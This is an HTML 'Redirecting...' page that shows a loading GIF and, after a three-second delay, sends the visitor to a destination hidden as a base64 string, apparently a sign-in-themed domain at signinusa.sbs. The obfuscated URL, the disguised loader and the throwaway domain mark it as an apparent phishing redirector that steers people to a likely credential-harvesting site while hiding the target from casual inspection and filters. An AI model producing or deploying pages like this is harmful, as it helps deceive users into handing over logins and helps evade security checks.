<!DOCTYPE html>
<html>
<head>
  <title>Redirecting...</title>

  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #ffffff;
    }

    .loader img {
      width: 120px; /* Adjust size if needed */
      height: auto;
    }
  </style>

  <script>
    // Base64-encoded URL
    const encodedUrl = "aHR0cHM6Ly9zaWduaW51c2Euc2JzL3lhLw";

    // Delay redirect so GIF can be seen
    setTimeout(() => {
      const redirectUrl = atob(encodedUrl);
      window.location.href = redirectUrl;
    }, 3000); // 3 seconds
  </script>
</head>

<body>
  <div class="loader">
    <img src="https://signinusa.sbs/png/loading.gif" alt="Loading...">
  </div>
</body>
</html>
